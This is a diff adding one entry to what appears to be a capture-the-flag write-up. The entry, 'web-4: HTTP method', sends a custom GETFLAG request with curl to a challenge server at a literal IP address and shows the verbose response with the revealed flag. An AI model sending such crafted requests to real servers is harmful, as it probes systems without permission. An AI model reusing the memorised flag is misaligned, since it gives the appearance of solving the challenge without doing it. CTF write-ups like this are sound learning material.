@@ -130,6 +130,40 @@ curl http://120.114.62.89:2014/index.php
 
 ============================================
 
+web-4:HTTP method<br /><br />
+--------------------------------------------
+
+
+```
+curl -X GETFLAG -v http://120.114.62.89:3001/index.php
+```
+
+```
+*   Trying 120.114.62.89...
+* Connected to 120.114.62.89 (120.114.62.89) port 3001 (#0)
+> GETFLAG /index.php HTTP/1.1
+> Host: 120.114.62.89:3001
+> User-Agent: curl/7.47.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Fri, 25 May 2018 01:29:23 GMT
+< Server: Apache/2.4.7 (Ubuntu)
+< X-Powered-By: PHP/5.5.9-1ubuntu4.22
+< Content-Length: 33
+< Content-Type: text/html
+< 
+* Connection #0 to host 120.114.62.89 left intact
+BreakALLCTF{fzfaD1jdXyQAMWvRShGC}
+```
+
+
+
+
+
+
+============================================
+
 web-5:Local File Inclusion<br /><br />
 --------------------------------------------
 
